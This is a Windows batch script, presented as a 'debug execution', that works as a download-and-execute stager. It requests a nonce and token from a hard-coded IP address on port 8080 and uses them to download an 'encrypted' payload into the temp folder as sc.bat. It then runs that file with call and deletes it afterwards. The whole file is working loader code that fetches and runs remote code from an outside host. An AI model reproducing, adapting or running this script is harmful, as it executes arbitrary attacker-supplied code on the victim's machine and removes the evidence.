@echo on
setlocal enabledelayedexpansion

echo ================================
echo [INIT] Starting debug execution
echo ================================

set BASE=http://82.29.153.101:8080
set FILE=%temp%\sc.bat
set AUTHFILE=%temp%\auth.json

echo [INFO] BASE=%BASE%
echo [INFO] FILE=%FILE%
echo [INFO] TEMP=%temp%

echo.
echo ================================
echo [STEP 1] AUTH REQUEST
echo ================================

curl -v "%BASE%/auth/key" -o "%AUTHFILE%"
set CURL_AUTH_RC=%errorlevel%

echo [DEBUG] curl exit code: %CURL_AUTH_RC%

if not "%CURL_AUTH_RC%"=="0" (
    echo [ERROR] AUTH request failed
    exit /b 1
)

echo [DEBUG] AUTH response raw:
type "%AUTHFILE%"

echo.
echo ================================
echo [STEP 2] PARSING JSON
echo ================================

for /f "usebackq delims=" %%i in (`powershell -NoP -Command "try {(Get-Content '%AUTHFILE%' | ConvertFrom-Json).nonce} catch {''}"`) do set NONCE=%%i
for /f "usebackq delims=" %%i in (`powershell -NoP -Command "try {(Get-Content '%AUTHFILE%' | ConvertFrom-Json).token} catch {''}"`) do set TOKEN=%%i

echo [DEBUG] NONCE=!NONCE!
echo [DEBUG] TOKEN=!TOKEN!

del "%AUTHFILE%"

if "!NONCE!"=="" (
    echo [ERROR] NONCE is empty
    exit /b 1
)

if "!TOKEN!"=="" (
    echo [ERROR] TOKEN is empty
    exit /b 1
)

echo.
echo ================================
echo [STEP 3] PAYLOAD REQUEST
echo ================================

curl -v -H "X-Nonce: !NONCE!" -H "X-Token: !TOKEN!" "%BASE%/payload/encrypted" -o "%FILE%"
set CURL_PAYLOAD_RC=%errorlevel%

echo [DEBUG] curl exit code: %CURL_PAYLOAD_RC%

if not "%CURL_PAYLOAD_RC%"=="0" (
    echo [ERROR] PAYLOAD request failed
    exit /b 1
)

echo.
echo ================================
echo [STEP 4] VALIDATING FILE
echo ================================

if not exist "%FILE%" (
    echo [ERROR] File not created
    exit /b 1
)

for %%A in ("%FILE%") do (
    echo [DEBUG] File size: %%~zA bytes
    if %%~zA==0 (
        echo [ERROR] File is empty
        exit /b 1
    )
)

echo [DEBUG] First 10 lines of payload:
for /f "usebackq tokens=* delims=" %%l in ("%FILE%") do (
    echo %%l
    set /a COUNT+=1
    if !COUNT! GEQ 10 goto :break
)
:break

echo.
echo ================================
echo [STEP 5] EXECUTION
echo ================================

echo [INFO] Executing payload...
call "%FILE%"
set EXEC_RC=%errorlevel%

echo [DEBUG] Execution exit code: %EXEC_RC%

echo.
echo ================================
echo [STEP 6] CLEANUP
echo ================================

if exist "%FILE%" (
    del "%FILE%"
    echo [INFO] Payload deleted
) else (
    echo [WARN] Payload file not found during cleanup
)

echo.
echo ================================
echo [DONE]
echo ================================

endlocal